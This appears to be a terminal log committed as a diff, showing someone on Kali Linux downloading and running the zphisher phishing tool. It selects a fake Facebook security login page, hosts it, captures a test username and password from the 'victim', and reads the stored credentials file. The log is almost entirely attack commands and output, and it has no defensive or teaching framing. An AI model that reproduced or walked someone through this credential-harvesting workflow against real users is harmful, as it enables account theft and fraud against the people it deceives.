@@ -1,0 +1,93 @@
+// download the zphisher tool for kali (link) = https://github.com/htr-tech/zphisher.git
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/zphisher]
+└─$ ls
+auth  Dockerfile  LICENSE  make-deb.sh  README.md  run-docker.sh  scripts  zphisher.sh
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/zphisher]
+└─$ ./zphisher.sh
+                                                                                                                                                                                                                                         
+ ______      _     _     _                                                                                                                                                                                                                 
+|___  /     | |   (_)   | |                                                                                                                                                                                                                
+   / / _ __ | |__  _ ___| |__   ___ _ __                                                                                                                                                                                                   
+  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|                                                                                                                                                                                                  
+ / /__| |_) | | | | \__ \ | | |  __/ |                                                                                                                                                                                                     
+/_____| .__/|_| |_|_|___/_| |_|\___|_|                                                                                                                                                                                                     
+      | |                                                                                                                                                                                                                                  
+      |_|                Version : 2.3.5                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+[-] Tool Created by htr-tech (tahmid.rayat)                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+[::] Select An Attack For Your Victim [::]                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+[01] Facebook      [11] Twitch       [21] DeviantArt                                                                                                                                                                                       
+[02] Instagram     [12] Pinterest    [22] Badoo                                                                                                                                                                                            
+[03] Google        [13] Snapchat     [23] Origin                                                                                                                                                                                           
+[04] Microsoft     [14] Linkedin     [24] DropBox                                                                                                                                                                                          
+[05] Netflix       [15] Ebay         [25] Yahoo                                                                                                                                                                                            
+[06] Paypal        [16] Quora        [26] Wordpress                                                                                                                                                                                        
+[07] Steam         [17] Protonmail   [27] Yandex                                                                                                                                                                                           
+[08] Twitter       [18] Spotify      [28] StackoverFlow                                                                                                                                                                                    
+[09] Playstation   [19] Reddit       [29] Vk                                                                                                                                                                                               
+[10] Tiktok        [20] Adobe        [30] XBOX                                                                                                                                                                                             
+[31] Mediafire     [32] Gitlab       [33] Github                                                                                                                                                                                           
+[34] Discord       [35] Roblox                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+[99] About         [00] Exit                                                                                                                                                                                                               
+                                                                                                                                                                                                                                           
+[-] Select an option : 01                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                           
+[01] Traditional Login Page                                                                                                                                                                                                                
+[02] Advanced Voting Poll Login Page                                                                                                                                                                                                       
+[03] Fake Security Login Page                                                                                                                                                                                                              
+[04] Facebook Messenger Login Page                                                                                                                                                                                                         
+                                                                                                                                                                                                                                           
+[-] Select an option : 03                                                                                                                                                                                                                                                    
+  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄                                                                                                                                                                                                          
+  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄                                                                                                                                                                                                          
+  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ 2.3.5                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+[-] Successfully Hosted at : http://127.0.0.1:8080                                                                                                                                                                                          
+                                                                                                                                                                                                                                            
+[-] Waiting for Login Info, Ctrl + C to exit...                                                                                                                                                                                             
+                                                                                                                                                                                                                                            
+[-] Victim IP Found !                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                            
+[-] Victim's IP : 127.0.0.1                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+[-] Saved in : auth/ip.txt                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                            
+[-] Login info Found !!                                                                                                                                                                                                                     
+                                                                                                                                                                                                                                            
+[-] Account : jaskaran                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+[-] Password : 999999999999                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+[-] Saved in : auth/usernames.dat                                                                                                                                                                                                           
+                                                                                                                                                                                                                                            
+[-] Waiting for Next Login Info, Ctrl + C to exit. ^C                                                                                                                                                                                       
+                                                                                                                                                                                                                                            
+[!] Program Interrupted.                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher]
+└─$ ls         
+auth  Dockerfile  LICENSE  make-deb.sh  README.md  run-docker.sh  scripts  zphisher.sh
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher]
+└─$ cd auth    
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher/auth]
+└─$ ls
+ip.txt  usernames.dat
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher/auth]
+└─$ cd usernames.dat 
+cd: not a directory: usernames.dat
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher/auth]
+└─$ cat usernames.dat 
+Facebook Username: jaskaran Pass: 999999999999
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Downloads/zphisher/auth]
+└─$ 
